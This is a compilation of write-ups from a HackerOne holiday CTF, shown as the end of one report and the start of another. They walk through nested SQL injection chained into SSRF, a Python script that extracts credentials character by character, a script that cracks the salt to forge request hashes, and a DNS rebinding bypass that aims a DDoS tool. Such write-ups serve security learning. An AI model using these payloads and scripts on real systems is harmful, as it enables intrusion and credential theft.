6+----------+------+--------------------------------------+
7| album_id | id   | photo                                |
8+----------+------+--------------------------------------+
9| 1        | 1    | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
10| 1        | 2    | 1254314b8292b8f790862d63fa5dce8f.jpg |
11| 2        | 3    | 32febb19572b12435a6a390c08e8d3da.jpg |
12| 3        | 4    | db507bdb186d33a719eb045603020cec.jpg |
13| 3        | 5    | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
14| 3        | 6    | 13d74554c30e1069714a5a9edda8c94d.jpg |
15+----------+------+--------------------------------------+
16
17Database: recon
18Table: album
19[3 entries]
20+------+--------+-----------+
21| id   | hash   | name      |
22+------+--------+-----------+
23| 1    | 3dir42 | Xmas 2018 |
24| 2    | 59grop | Xmas 2019 |
25| 3    | jdh34k | Xmas 2020 |
26+------+--------+-----------+
Hmm...the results don't have login info or anything particularly interesting. Still, we can make note of this vulnerability and keep looking for more issues.
Fuzzing
Let's do a quick fuzzing check to see if there are some pages we can't view from clicking the UI:
Code 317 Bytes
1$ ffuf -w raft-small-words.txt -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/FUZZ -fc 404 -mc all
2
3uploads                 [Status: 403, Size: 145, Words: 3, Lines: 7]
4api                     [Status: 200, Size: 2390, Words: 888, Lines: 54]
5picture                 [Status: 200, Size: 21, Words: 3, Lines: 1]
The uploads and picture endpoints get called from the album page. Let's view this api page though:
<image_29>
I tried guessing api endpoints, but any text you put after /api/ returns the same 401 {"error":"This endpoint cannot be visited from this IP address"} result.
Examining the Album Images
I noticed the album images were loading in an unusual way. Let's look a little closer at the 2018 album page:
Code 42 Bytes
1GET /r3c0n_server_4fdk59/album?hash=3dir42
Code 528 Bytes
1<div class="col-md-4">
2    <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzBhMzgyYzYxNzdiMDQzODZlMWE0NWNlZWFhODEyZTRlLmpwZyIsImF1dGgiOiJlYzVhOTkyMGUxNzdjY2M4NDk3NDE0NmY5M2FlMDRiMCJ9">
3</div>
4
5<div class="col-md-4">
6    <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEyNTQzMTRiODI5MmI4Zjc5MDg2MmQ2M2ZhNWRjZThmLmpwZyIsImF1dGgiOiI5OWMwMGQzZWVmNzA4NDdhYzQ4ODhhZTg1ZDBiNGM3ZSJ9">
7</div>
Decoding the two base64 strings we get these two results:
Code 241 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/0a382c6177b04386e1a45ceeaa812e4e.jpg","auth":"ec5a9920e177ccc84974146f93ae04b0"}
2{"image":"r3c0n_server_4fdk59\/uploads\/1254314b8292b8f790862d63fa5dce8f.jpg","auth":"99c00d3eef70847ac4888ae85d0b4c7e"}
Trying to go to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/uploads/0a382c6177b04386e1a45ceeaa812e4e.jpg directly gives an "Image cannot be viewed directly" error. It is interesting to note that when the server gets a request to the picture endpoint it will query the uploads endpoint to find the photo it needs. By changing the url of the image to r3c0n_server_4fdk59\/api\/FUZZ we could get authenticated requests to figure out what is hiding in the internal api.
I did try to set up a manual request to see if I could get any kind of response from the API: {"image":"r3c0n_server_4fdk59\/uploads\/1","auth":"bbf295d686bd2af346fcd80c5398de9a"}. After converting it to base64, the request was https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEiLCJhdXRoIjoiYmJmMjk1ZDY4NmJkMmFmMzQ2ZmNkODBjNTM5OGRlOWEifQ==. Unfortunately, this and any other custom request to picture returns an invalid authentication hash error. Looks like it won't be this easy, and we need to figure out a way around the authentication as well.
We Need to Go Deeper
I was stuck here for a while. The CTF admin posted this hint:
<image_30>
Pretty weird hint, but I was willing to take anything at this point. It's a screenshot from Inception, a movie about dreams within dreams. Looks like we need to do exploits within exploits.
We know from the sqlmap dump above that the authentication information is not saved to the database. The server may be calculating authentication hashes on the fly for each of the pictures that comes up as being part of the album. If we can tune our injection just right, we could be able to trick the server into thinking it got an image from the database, and it would generate an authentication hash for it.
Recall that we fetch album photos by querying /r3c0n_server_4fdk59/album?hash= with an album's hash. From here, the server is able to determine which photos to display. Since this parameter is vulnerable, we can run a special query on the information schema to view the currently executing query. (Since the album title is rendered on the result page we have an easy way to view the results of our injection.)
GET /r3c0n_server_4fdk59/album?hash=fakehash'+UNION+SELECT+1,1,info+FROM+information_schema.processlist--+
Code 134 Bytes
1<h1 class="text-center">select * from album where hash = 'fakehash' UNION SELECT 1,1,info from information_schema.processlist-- '</h1>
Ok. From this response, we know the base query the server is executing is select * from album where hash = '{input}'. Since the server then retrieves all the pictures in that album, there must be a query right after executing something like select * from photo where album_id = '{id_from_album_query}'.
We need to go deeper. If this followup query is also vulnerable to SQL injection, we could craft a specific picture to load. (And we could potentially get an authenticated Server Side Request Forgery (SSRF) by doing this.)
### 1. Recreating the Table
Since we know the database schema from our sqlmap dump, we can recreate it in sqlfiddle to play with a local copy to work out the injection queries.
Code 127 Bytes
1create table album(id int, hash varchar(255), name varchar(255));
2create table photo(album_id int, id int, photo varchar(255));
### 2. Creating a Custom Album
Using the album hash fakehash' UNION SELECT 1337, 'my_hash', 'my_album_name'-- on the Grinch site would generate the following query:
Code 94 Bytes
1SELECT * FROM album WHERE hash = 'fakehash' UNION SELECT 1337, 'my_hash', 'my_album_name'-- ';
Which returns:
id	hash	name
1337	my_hash	my_album_name
And of course, querying the endpoint returns no photos since this album does not exist:
Code 94 Bytes
1GET /r3c0n_server_4fdk59/album?hash=fakehash'+UNION+SELECT+1337,+'my_hash',+'my_album_name'--+
Code 135 Bytes
1<div class="col-md-8 col-md-offset-2">
2    <h1 class="text-center">my_album_name</h1>
3    <div class="row">
4
5        
6    </div>
7</div>
### 3. Adding Photos to Albums
What's an album without some nice photos?
Using the payload fakehash' UNION SELECT "1337' UNION SELECT 0, 0, 'my_photo.jpg'-- ", 'my_hash', 'my_album_name'-- we generate this query:
Code 135 Bytes
1SELECT * FROM album WHERE hash = 'fakehash' 
2UNION SELECT "1337' UNION SELECT 0, 0, 'my_photo.jpg'-- ", 'my_hash', 'my_album_name'-- ';
Returning this result:
id	hash	name
1337' UNION SELECT 0, 0, 'my_photo.jpg'--	my_hash	my_album_name
And then, when the followup image fetch query runs, it will execute:
Code 82 Bytes
1SELECT * FROM photo WHERE album_id = '1337' UNION SELECT 0, 0, 'my_photo.jpg'-- ';
Returning:
album_id	id	photo
0	0	my_photo.jpg
Running it:
Code 135 Bytes
1GET /r3c0n_server_4fdk59/album?hash=fakehash'+UNION+SELECT+"1337'+UNION+SELECT+0,+0,+'my_photo.jpg'--+",+'my_hash',+'my_album_name'--+ 
Code 403 Bytes
1<div class="col-md-8 col-md-offset-2">
2    <h1 class="text-center">my_album_name</h1>
3    <div class="row">
4
5            <div class="col-md-4">
6                <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL215X3Bob3RvLmpwZyIsImF1dGgiOiJlODgyNzNkZDM0YmRkMmRlN2M2MGRkNjQ1MGVhZDg4ZiJ9">
7            </div>
8        
9    </div>
10</div>
Decoded from base64, the image is:
Code 96 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/my_photo.jpg","auth":"e88273dd34bdd2de7c60dd6450ead88f"}
Naturally, the image doesn't load on the page since this photo doesn't exist. We do note that the authorization hash was calculated though!
### 4. SSRF Time
Now we have a way to get authenticated results. We know that the server is assuming our photo is in the uploads directory. We can instead have our photo be named ..\/api\/FUZZ and fuzz for api endpoints.
I wrote a quick program to try every endpoint in a common API endpoints wordlist:
Code 1.29 KiB
1#!/usr/bin/env python3
2
3import re
4import base64
5import requests
6import sys
7  
8BASE_URL = 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/'
9PAYLOAD = "fakehash'+UNION+SELECT+\"1337'+UNION+SELECT+0,+0,+'..\/api\/FUZZ'--+\",+'my_hash',+'my_album_name'--+"
10SECLISTS_DIR = '../../../../SecLists/Discovery/Web-Content/'
11
12def fuzz(wordlist, avoid_code='404', prefix='', suffix=''):
13    with open(SECLISTS_DIR + wordlist) as payloads:
14        lines = [x.strip() for x in payloads]
15        for i, line in enumerate(lines):
16            process(PAYLOAD.replace('FUZZ', prefix + line + suffix), avoid_code)
17
18def process(payload, avoid_code):
19    album = requests.get(BASE_URL + 'album?hash=' + payload)
20    picture_data = re.match(r".*picture\?data=(.*)\"", str(album.content)).groups()[0]
21
22    api_call = requests.get(BASE_URL + 'picture?data=' + picture_data)
23
24    if avoid_code not in str(api_call.content):
25        print(str(base64.b64decode(picture_data)))
26        print(str(api_call.content))
27        return True
28    return False
29    
30sys.argv[1] == 'endpoints' and fuzz('common-api-endpoints-mazen160.txt', avoid_code='404') # finds endpoints "ping" and "user"
31sys.argv[1] == 'parameters' and fuzz('burp-parameter-names.txt', avoid_code='400', prefix='user?', suffix='=1') # finds parameters "username" and "password"
Most endpoints just 404, but the endpoints user and ping both return:
Code 188 Bytes
1HTTP/1.1 200 OK
2Server: nginx/1.18.0 (Ubuntu)
3Date: Mon, 28 Dec 2020 20:49:49 GMT
4Content-Type: text/html; charset=UTF-8
5Connection: close
6Content-Length: 29
7
8Invalid content type detected
When you query a normal image, you get a Content-Type of image/jpeg. The header here shows that it is returning a text result and it is confused because it is an images api. This error is fine though, it shows us that even though we aren't able to see the output of this api, we know that it exists.
The last line of the program fuzzes to find the parameters of the user endpoint. Most of the wordlist returns a 400 status, but username and password both return a 204 No Content. With some fiddling I could see that the username and password fields were search fields. Trying username=% would return the "Invalid content type detected" error, while trying username=1 would return 204 No Content. This tells us that we have a true or false response to know if a certain user is existing. Using this, we can exfiltrate the login in the same way we did for day 9. To do this, I added an extra function to the existing script:
Code 413 Bytes
1CHARS = "qwertyuiopasdfghjklzxcvbnm1234567890"
2
3def exfiltrate(field):
4    accumulator = ''
5    while True:
6        for char in CHARS:
7            payload = PAYLOAD.replace('FUZZ', f'user?{field}={accumulator}{char}%')
8            if process(payload, avoid_code='204'):
9                accumulator += char 
10
11sys.argv[1] == 'username' and exfiltrate('username')
12sys.argv[1] == 'password' and exfiltrate('password')
Running:
Code 2.55 KiB
1$ ./api_fuzz.py username
2b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=g%","auth":"e8b7a05ab04f3c1165c79d08d331169a"}'
3b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=gr%","auth":"9628e7ff516491d7fef561b270e6bf96"}'
4b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=gri%","auth":"b72688442a598cee8ddb8b3c012b0ec4"}'
5b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=grin%","auth":"52bce9f7f3f8d95abed4a447545656d8"}'
6b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=grinc%","auth":"aecf8d3c5edd3986815fb8f8bc31982f"}'
7b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=grinch%","auth":"6f86b86d2013ab5ab58abd4d77b44506"}'
8b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=grincha%","auth":"fb005d3fc853a5b48927e526be4c7daf"}'
9b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=grinchad%","auth":"2eac9d3c5e350d26c8d44cd7f4135fbd"}'
10b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=grinchadm%","auth":"6d4771f64f64ed71f8782de9cad19a68"}'
11b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=grinchadmi%","auth":"07c90be0a9c886d667407f0bceb85dc1"}'
12b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?username=grinchadmin%","auth":"492e8c29c6b95c00bc37be3884596c86"}'
13
14$ ./api_fuzz.py password
15b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s%","auth":"cce984225bf170447abaad0fa0453ce7"}'
16b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4%","auth":"e1363f9484af0f5f74bb9d742b46e6dd"}'
17b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4n%","auth":"aec35f51d4c9cd352748ddfc96f420a5"}'
18b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4nt%","auth":"53e5891faf4d065a21a2cfa8ae929627"}'
19b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4nt4%","auth":"6baf718704fe9c42d165410e4e37471c"}'
20b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4nt4s%","auth":"0c4fedfb721842a56a05405307eff3eb"}'
21b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4nt4su%","auth":"728b47db8b71517e7d8bf0462fdf60bf"}'
22b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4nt4suc%","auth":"e7fb3d6a9c0adbd839ac69922a2cddfc"}'
23b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4nt4suck%","auth":"d06aa53fa99473d10e523cd1cd8b1697"}'
24b'{"image":"r3c0n_server_4fdk59\\/uploads\\/..\\/api\\/user?password=s4nt4sucks%","auth":"c1e451e64373509cd5f30e4899fdb2ce"}'
Ok! Using the exfiltrated login of grinchadmin/s4nt4sucks we can access the attack box!
<image_31>
flag{07a03135-9778-4dee-a83c-7ec330728e72}
Takeaways
It can be possible to dump an entire database's contents when there is an endpoint vulnerable to SQLi
Exploits can be chained to wreak more havoc
If an endpoint replies differently depending on whether or not some data exists you can exfiltrate information about it
Day 12
Home stretch! Currently we are logged into the attack server after completing yesterday's challenge.
I can see that the attack server is primed to knock Santa's servers offline. To beat this challenge, we will need to redirect the attack to the Grinch's server instead. For now though, let's launch an attack on Santa just to see what happens. Sorry, Santa! Clicking the first link gets us:
Code 678 Bytes
1grinch@attackbox:~/tools$ ./ddos --load b3d6931a61c78cf4dd1d8e4e7ad98b2a.target
2Setting Target Information
3Getting Host Information for: 203.0.113.33
4Spinning up botnet
5Launching attack against: 203.0.113.33 / 203.0.113.33
6Launching attack against: 203.0.113.33 / 203.0.113.33
7ping 203.0.113.33
8ping 203.0.113.33
964 bytes from 203.0.113.33: icmp_seq=1 ttl=118 time=18.1 ms
1064 bytes from 203.0.113.33: icmp_seq=1 ttl=118 time=18.1 ms
1164 bytes from 203.0.113.33: icmp_seq=2 ttl=118 time=22.9 ms
1264 bytes from 203.0.113.33: icmp_seq=3 ttl=118 time=16.3 ms
1364 bytes from 203.0.113.33: icmp_seq=3 ttl=118 time=16.3 ms
14Host still up, maybe try again?
15Host still up, maybe try again?
16.
It seems Santa has some resilient servers. The attack buttons navigate to the following URLs to begin the attacks:
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuNTMiLCJoYXNoIjoiMjgxNGY5YzczMTFhODJmMWI4MjI1ODUwMzlmNjI2MDcifQ==
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMjEzIiwiaGFzaCI6IjVhYTliNWE0OTdlMzkxOGMwZTE5MDBiMmEyMjI4YzM4In0=
Decoding each of the payload parameters, I can see this is the information being sent:
Code 204 Bytes
1{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
2{"target":"203.0.113.53","hash":"2814f9c7311a82f1b822585039f62607"}
3{"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}
Ok! If we can replace the target with 127.0.0.1 (the localhost address) we can take down the Grinch server. Unfortunately, just taking one of the existing payloads and replacing the address with the local IP gave me an invalid protection hash error. We will need to figure out how these hashes work.
Figuring out How These Hashes Work
This hash identification site had some suggestions for what the hash could be. MD5 seemed likely, but just doing MD5(ip_address) was not returning the hash in the hash field. Among the suggestions were md5($pass.$salt) and md5($salt.$pass). We know the hash value, and we know the "pass" is the ip address. We can try to calculate the salt. And if we are lucky, Grinch will be using the same salt for every hash.
I wrote a quick program to determine the salt for the first IP and hash combination in the list of Santa server payloads.
Code 777 Bytes
1#!/usr/bin/env python3
2import hashlib
3
4TARGET_HASH = '5f2940d65ca4140cc18d0878bc398955'
5IP = '203.0.113.33'
6
7with open('../../../SecLists/Passwords/Leaked-Databases/rockyou.txt', errors="ignore") as salt_file:
8    salts = [x.strip() for x in salt_file]
9    found = False
10    for i, salt in enumerate(salts):
11        if i % 100 == 0:
12            print(f"{round((i/len(salts) * 100), 1)}%", end="\r")
13
14        if hashlib.md5((salt + IP).encode('utf-8')).hexdigest() == TARGET_HASH:
15            print("Format is MD5(salt + IP)")
16            found = True
17        elif hashlib.md5((IP + salt).encode('utf-8')).hexdigest() == TARGET_HASH:
18            print("Format is MD5(IP + salt")
19            found = True
20        if found:
21            print(f"Salt is '{salt}'")
22            break
Code 61 Bytes
1$ ./exploit.py
2Format is MD5(salt + IP)
3Salt is 'mrgrinch463'
A quick test shows this works for our existing values
IP	MD5(salt + IP)
203.0.113.33	5f2940d65ca4140cc18d0878bc398955
203.0.113.53	2814f9c7311a82f1b822585039f62607
203.0.113.213	5aa9b5a497e3918c0e1900b2a2228c38
Great! Now we can forge some authenticated requests.
Forging Authenticated Requests
Using the trick above, we can make a payload for the local IP {"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}. After encoding as base64, we can run the attack by accessing /attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==.
Output:
Code 291 Bytes
1grinch@attackbox:~/tools$ ./ddos --load 5ef7f0e45440b03e470946ab65f02a9c.target
2Setting Target Information
3Getting Host Information for: 127.0.0.1
4Local target detected, aborting attack
5Setting Target Information
6Getting Host Information for: 127.0.0.1
7Local target detected, aborting attack
Hmm, there is a protection mechanism to prevent us from attacking the Grinch's own server. The output shows us that it is determining this by looking up host information. Maybe we can get around this with some DNS trickery.
Some DNS Trickery
I found this blog post which explains DNS rebinding. A main takeaway from the post is:
DNS can be abused to trick web browsers into communicating with servers they don’t intend to.
Sounds perfect! The rbndr project can be used for performing DNS Rebinding attacks. They have an example address in the readme, 7f000001.c0a80001.rbndr.us, which will randomly respond to DNS requests by saying its address is either 127.0.0.1 or 192.168.0.1. The TTL is very short to force the server to constantly refetch the IP address of the domain. The 192.168.0.1 address is allowed by the Grinch network, but 127.0.0.1 is supposed to be rejected. With some luck, we can have this server return the allowed address when the host validation runs, and then the local address by the time the botnet attack wants to start.
I crafted the following payload with the rbndr address,
{"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}, which maps to this request:
/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9
After running that exploit a couple times until the DNS resolutions lined up properly, I was able to get the following output:
Code 408 Bytes
1grinch@attackbox:~/tools$ ./ddos --load fc007b100f6745bae362a35918c6a102.target
2Setting Target Information
3Getting Host Information for: 7f000001.c0a80001.rbndr.us
4Host resolves to 192.168.0.1
5Spinning up botnet
6Launching attack against: 7f000001.c0a80001.rbndr.us / 127.0.0.1
7No Response from attack server, retrying...
8No Response from attack server, retrying...
9No Response from attack server, retrying...
Suddenly the page redirected:
<image_32>
A 404, what a beautiful sight!
flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
Takeaways
Computers can be tricked into communicating with servers they don't intend to with DNS tricks
The Grinch's plans were foiled!
Impact
The attacker can log into the attack box dashboard and knock Grinch Networks offline.



==================================================

Report File: 1068434.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Information Disclosure

Contents:

Intro
This is my report for the 2020 Hacky Holidays HackerOne CTF. I managed to find all 12 flags with the assistance of my little helper, Jake. He specialises in brute-forcing via a unique keyboard mashing technique:
<image_0>
Anywho, let's get started...
Flag 1: Robots
The first one was a nice easy find as a result of some basic enumeration.
Looking in /robots.txt, I immediately spotted the flag:
Code 85 Bytes
1User-agent: *
2Disallow: /s3cr3t-ar3a
3Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
Flag 2: Moved
The content of the robots.txt file also contained a clue about the second flag:
Code 22 Bytes
1Disallow: /s3cr3t-ar3a
There was a /s3cr3t-ar3a page which the server requested spiders to avoid. Very suspect!
The secret area consisted of a message telling me the page had moved.
If I had hit "inspect element" and browsed the DOM I could have quite quickly spotted the flag.
<image_1>
However...
Unintended Solution
I'm ashamed to say I went the much longer way around. I initially viewed the static source code of the page, and noticed that the jQuery library wasn't loaded from a CDN like everything else on the site.
Viewing the file showed the version of jQuery:
Code 21 Bytes
1/*! jQuery v3.5.1 ...
I downloaded the file and then grabbed the "real" jQuery v3.5.1. Diffing them showed an interesting anomaly in the CTF version of the file:
<image_2>
Interesting! Piecing it together revealed the flag. At this point I realised I could have just inspected element and seen the flag. Whoops.
Flag: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
Flag 3: People Rater
The last challenge hinted at the existence of the /apps page. On this page I found another link, this time to the People Rater application at /people-rater.
I was presented with a list of buttons, each with the name of a person. Clicking a button resulted in an alert box with a description of the person.
Digging a little deeper with dev tools, I could see that when I clicked a button, an HTTP request was made in the background. One such example is https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=, which responded with:
Code 57 Bytes
1{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
It looked like that id was base64 encoded. Decoding it resulted in:
Code 8 Bytes
1{"id":2}
Going through the rest of the list and decoding the id field for each revealed that there was no record with an id of 1 in the list. Perhaps there was something interesting in the missing record?
I base64 encoded some JSON with an id of 1:
Code 40 Bytes
1$ echo '{"id":1}' | base64 
2eyJpZCI6MX0K
...and supplied the resultant value to the entry endpoint: /people-rater/entry?id=eyJpZCI6MX0K, and got a nice response:
Code 135 Bytes
1{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
There was the flag!
Flag: flag{b705fb11-fb55-442f-847f-0931be82ed9a}
Flag 4: Swag Shop
A quick browse of the swag shop source code revealed the existence of an API:
<image_3>
I decided to try a bit of fuzzing to reveal any other API endpoints that might help me to progress.
Fuzzing with:
Code 58 Bytes
1scout url -s https://hackyholidays.h1ctf.com/swag-shop/api
...revealed:
Code 43 Bytes
1/swag-shop/api/user
2/swag-shop/api/sessions
Hitting the user endpoint gave a 400 status and told me I was missing required parameters. I put that to one side for a moment and started to look at sessions instead.
The sessions endpoint returned a list of sessions!
Code 2.14 KiB
1{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="]}
These looked like base64, so I decoded them:
Code 1.75 KiB
1$ curl https://hackyholidays.h1ctf.com/swag-shop/api/sessions | jq -r '.sessions[]' | base64 -d | jq
2
3{
4  "user": null,
5  "cookie": "YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU="
6}
7{
8  "user": null,
9  "cookie": "ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ="
10}
11{
12  "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
13  "cookie": "NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
14}
15{
16  "user": null,
17  "cookie": "MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE="
18}
19{
20  "user": null,
